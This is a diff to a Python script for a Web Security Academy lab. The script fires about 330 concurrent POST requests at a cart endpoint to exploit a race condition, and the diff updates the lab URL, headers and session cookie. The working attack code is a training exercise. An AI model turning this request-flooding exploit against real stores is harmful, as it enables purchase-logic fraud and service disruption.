@@ -27,25 +27,25 @@ from typing import Dict, Any
 # Required updates:
 # - URL: Target endpoint
 # - Host header in HEADERS
-# - Origin header in HEADERS  
+# - Origin header in HEADERS
 # - Referer header in HEADERS
 # - Session cookie in COOKIES
 # - Request count 'n' in main() function
 # =============================================================================
 
 # Target configuration - UPDATE THESE VALUES
-URL = 'https://0adb00140391efa182e1b11f00420025.web-security-academy.net/cart'
+URL = 'https://0a820027030cd29f8705e3c600150019.web-security-academy.net/cart'
 
 # HTTP Headers - UPDATE Host, Origin, and Referer to match your lab instance
 HEADERS: Dict[str, str] = {
-    'Host': '0adb00140391efa182e1b11f00420025.web-security-academy.net',
+    'Host': '0a820027030cd29f8705e3c600150019.web-security-academy.net',
     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.5',
     'Accept-Encoding': 'gzip, deflate, br',
     'Content-Type': 'application/x-www-form-urlencoded',
-    'Origin': 'https://0adb00140391efa182e1b11f00420025.web-security-academy.net',
-    'Referer': 'https://0adb00140391efa182e1b11f00420025.web-security-academy.net/product?productId=1',
+    'Origin': 'https://0a820027030cd29f8705e3c600150019.web-security-academy.net',
+    'Referer': 'https://0a820027030cd29f8705e3c600150019.web-security-academy.net/product?productId=1',
     'Upgrade-Insecure-Requests': '1',
     'Sec-Fetch-Dest': 'document',
     'Sec-Fetch-Mode': 'navigate',
@@ -57,19 +57,20 @@ HEADERS: Dict[str, str] = {
 }
 
 # Session cookies - UPDATE with your session token from Burp Suite
-COOKIES: Dict[str, str] = {'session': 'EMZUEWrqMIoqebLEJZJ5ihADmS6h44Y0'}
+COOKIES: Dict[str, str] = {'session': 're4BQfkvR9vFZIzemtceiZZrIQ0zeOc3'}
 
 # POST data payload - Modify as needed for your specific lab
 DATA: Dict[str, str] = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '99'}
 
+
 async def send_one(session: aiohttp.ClientSession, i: int) -> str:
     """
     Send a single HTTP POST request to the target URL.
-    
+
     Args:
         session: aiohttp ClientSession instance
         i: Request index for logging purposes
-        
+
     Returns:
         Response text content
     """
@@ -85,39 +86,40 @@ async def send_one(session: aiohttp.ClientSession, i: int) -> str:
         print(f"[{i+1:03d}] ❌ ERROR: {str(e)}")
         return ""
 
+
 async def main():
     """
     Main execution function that orchestrates the race condition attack.
-    
+
     This function creates multiple concurrent HTTP requests to exploit
     potential race conditions in the target web application.
     """
     # Configuration
-    n = 337  # Number of concurrent requests - ADJUST AS NEEDED
+    n = 330  # Number of concurrent requests - ADJUST AS NEEDED
     connection_limit = 50  # Maximum concurrent connections
     timeout = aiohttp.ClientTimeout(total=30)  # 30 second timeout
-    
+
     print(f"🚀 Starting race condition attack...")
     print(f"📊 Target: {URL}")
     print(f"🔢 Requests: {n}")
     print(f"🔗 Connection limit: {connection_limit}")
     print(f"⏱️  Timeout: {timeout.total}s")
     print("-" * 50)
-    
+
     start_time = time.time()
-    
+
     # Create TCP connector with connection pooling
     conn = aiohttp.TCPConnector(limit=connection_limit)
-    
+
     try:
         async with aiohttp.ClientSession(
-            connector=conn, 
+            connector=conn,
             timeout=timeout
         ) as session:
             # Create and execute all tasks concurrently
             tasks = [send_one(session, i) for i in range(n)]
             await asyncio.gather(*tasks, return_exceptions=True)
-            
+
     except KeyboardInterrupt:
         print("\n⚠️  Attack interrupted by user")
         sys.exit(1)
@@ -131,24 +133,26 @@ async def main():
         print(f"✅ Attack completed in {duration:.2f} seconds")
         print(f"📈 Average: {n/duration:.2f} requests/second")
 
+
 def validate_configuration() -> bool:
     """
     Validate that required configuration values have been updated.
-    
+
     Returns:
         True if configuration appears valid, False otherwise
     """
     # Check if default values are still being used
     if '0a390020035ec1b5821438f800a10031' in URL:
         print("⚠️  WARNING: You're using the default lab URL.")
-        print("   Please update the URL, headers, and cookies for your specific lab instance.")
+        print(
+            "   Please update the URL, headers, and cookies for your specific lab instance.")
         return False
-        
+
     if COOKIES.get('session') == '6RhAsnvNaKZ6UinARqIdbxeNxVCUMoOg':
         print("⚠️  WARNING: You're using the default session cookie.")
         print("   Please update the session cookie from your Burp Suite capture.")
         return False
-        
+
     return True
 
 
@@ -159,13 +163,13 @@ if __name__ == '__main__':
     print("📚 Educational Purpose Only")
     print("="*60)
     print()
-    
+
     # Validate configuration before starting
     if not validate_configuration():
         print("\n❌ Configuration validation failed.")
         print("Please update the script configuration and try again.")
         sys.exit(1)
-    
+
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
